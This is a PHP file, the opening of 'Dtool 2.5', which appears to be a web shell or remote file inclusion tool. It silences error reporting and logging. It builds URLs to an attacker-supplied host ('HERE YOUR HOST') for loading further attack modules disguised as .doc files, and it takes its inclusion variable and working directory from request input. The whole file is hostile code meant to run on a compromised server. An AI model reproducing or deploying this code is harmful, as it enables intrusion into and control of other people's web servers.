   <?php
   //The rules of Dtool - 2.5
   //revengans@gmail.com

   @closelog();
   @error_reporting(0);
   $vers="2.5 public";
   $remote_addr="http://HERE YOUR HOST _ANtrAX_ /cmd/";
   $format_addr=".doc";
   $cmd_addr=$remote_addr."tool25".$format_addr;
   $safe_addr=$remote_addr."safe25".$format_addr;
   $writer_addr=$remote_addr."writer25".$format_addr;
   $phpget_addr=$remote_addr."get25".$format_addr;
   $feditor_addr=$remote_addr."filed25".$format_addr;
   $put_addr=$remote_addr."filed_put25".$format_addr;
   $list_addr=$remote_addr."flist25".$format_addr;
   $copyd_addr=$remote_addr."copyd25".$format_addr;
   $style_addr=$remote_addr."style25".$format_addr;
   $total_addr="http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
   $inclvar = @substr($_SERVER['QUERY_STRING'],0,strpos($_SERVER['QUERY_STRING'],"="));

   function pegaContents($filename){//aiai, essa funcao aki eh bem legal, evita mto problema q tinha antes. by r3v3n
       if(function_exists('file_get_contents')){ $content_arquivo=file_get_contents($filename);}
       else if(function_exists('readfile') and function_exists('ob_start')){ob_start();readfile($filename); $content_arquivo=ob_get_contents(); ob_end_clean();}
       else if(function_exists('fread') and function_exists('fopen') and !strpos($filename,'http://')){ $content_arquivo=fread(fopen($filename, "a"),filesize($filename));}
       else $content_arquivo=false;

       return $content_arquivo;
   }

   if(empty($chdir)) $chdir=@$_GET['chdir'];
   if(empty($chdir)) $chdir=@$_REQUEST['chdir'];
   if(empty($chdir)) $chdir=getcwd();

   ?>
